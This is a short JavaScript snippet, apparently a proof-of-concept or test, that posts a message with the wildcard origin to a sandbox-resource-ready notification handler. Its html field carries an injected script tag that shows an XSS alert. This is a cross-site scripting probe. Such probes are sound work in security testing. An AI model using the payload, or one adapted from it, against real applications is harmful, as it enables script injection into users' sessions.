window.postMessage({
  method: 'ui/notifications/sandbox-resource-ready',
  params: {
    html: "<script>alert('XSS')</script>"
  }
}, "*");
